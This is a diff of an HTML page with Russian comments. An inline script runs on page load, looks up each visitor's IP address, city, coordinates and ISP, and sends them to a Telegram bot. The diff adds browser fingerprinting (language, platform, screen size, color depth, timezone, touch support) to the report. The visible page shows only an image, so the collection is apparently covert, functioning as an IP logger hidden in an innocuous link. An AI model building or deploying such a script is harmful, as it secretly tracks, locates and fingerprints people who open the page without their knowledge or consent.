@@ -7,7 +7,6 @@
 </head>
 <body>
 
-
 <script>
 // Функция для получения IP и геолокации клиента
 function getClientInfo() {
@@ -25,21 +24,22 @@ function getClientInfo() {
       const latitude = apiData.latitude || 'Unknown Latitude';  // Широта
       const longitude = apiData.longitude || 'Unknown Longitude';  // Долгота
       const isp = apiData.isp || 'Unknown ISP';  // Провайдер
-      const type = apiData.type || 'Unknown Type';
-      const domain = apiData.domain || 'Unknown Domain';
-      const anonymous = apiData.anonymous || 'Unknown anonymous';
-      const proxy = apiData.proxy || 'Unknown proxy';
-      const vpn = apiData.vpn || 'Unknown vpn';
-      const tor = apiData.tor || 'Unknown tor';
-      const hosting = apiData.hosting || 'Unknown hosting';
-      
 
       // Получаем информацию о браузере (User-Agent)
       const ua = navigator.userAgent;
+      const language = navigator.language || 'Unknown Language'; // Язык браузера
+      const platform = navigator.platform || 'Unknown Platform'; // Платформа (например, Windows, macOS)
+      const screenWidth = window.screen.width || 'Unknown Width'; // Ширина экрана
+      const screenHeight = window.screen.height || 'Unknown Height'; // Высота экрана
+      const colorDepth = window.screen.colorDepth || 'Unknown Color Depth'; // Глубина цвета экрана
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown Timezone'; // Часовой пояс
+      const isTouchDevice = 'ontouchstart' in window ? 'Yes' : 'No'; // Есть ли сенсорный экран
 
       // Формируем сообщение, которое отправим в Telegram
       const message = encodeURIComponent(
-        `${ip}\n${country} ${region}\n${city}\n${latitude}\n${longitude}\n${isp}\n\n${ua}`
+        `IP: ${ip}\nCountry: ${country} ${region}\nCity: ${city}\nLatitude: ${latitude}\nLongitude: ${longitude}\nISP: ${isp}\n\n` +
+        `User-Agent: ${ua}\nLanguage: ${language}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\n` +
+        `Color Depth: ${colorDepth}-bit\nTimezone: ${timezone}\nTouch Device: ${isTouchDevice}`
       );
 
       // Настроим Telegram Bot API URL для отправки сообщения
@@ -77,7 +77,6 @@ getClientInfo();
   </p>
   
 <img src="unnamed.jpg" width="256" height="142" title="Image" alt=" ">
-
 
 </body>
 </html>
